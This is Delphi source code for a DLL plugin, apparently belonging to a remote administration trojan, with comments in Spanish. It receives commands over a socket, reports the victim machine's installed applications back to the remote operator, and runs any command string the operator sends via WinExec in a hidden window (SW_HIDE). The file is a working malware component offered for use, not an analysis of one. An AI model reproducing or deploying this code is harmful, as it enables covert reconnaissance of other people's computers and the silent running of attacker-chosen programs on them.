library InstalledApplicationsS;

uses
  windows,
  UnitInstalledApplications,
  Winsock;

var
  ConId : integer;
  PNombre : string;

procedure CargaOffline();stdcall;
begin
  //dummy
end;


procedure Start(id : integer; nombre : string);stdcall;
begin
  ConID := ID; //Socket
  PNombre := nombre; //Nombre del plugin
end;

procedure Enviars(S: string);
begin
  s := 'PLUGINDATA|' + PNombre + '|' + s + #10#15#80#66#77#1#72#87;
  Send(ConID, S[1], Length(s), 0);
end;


procedure RecData(Recibido:string);stdcall;
begin
  if Copy(Recibido, 1, 13) = 'INSTALLEDAPPS' then
  begin
    Enviars('INSTALLEDAPPS|' + ListarApp('HKEY_LOCAL_MACHINE\' + regTarget));
  end
  else if Copy(Recibido, 1, 11) = 'UNINSTALLME' then
  begin
    //Deberia mandar un parametro mas y si no e sun desinstalador silencioso ejecutarlo como SW_SHOWNORMAL
    Delete(Recibido, 1, Pos('|', Recibido));
    //ShellExecute(0,'open',pchar(Copy(Recibido, 1, pos('|', Recibido) - 1)),'',SW_SHOWNORMAL);
    //myShellExecute(0, 'open', pchar(Copy(Recibido, 1, pos('|', Recibido) - 1)), nil, nil, SW_HIDE);
    winexec(pchar(Copy(Recibido, 1, pos('|', Recibido) - 1)), SW_HIDE);
  end;
end;


procedure Stop();Stdcall;
begin
  //dummy
end;

exports CargaOffline, Start, RecData, Stop;

end.
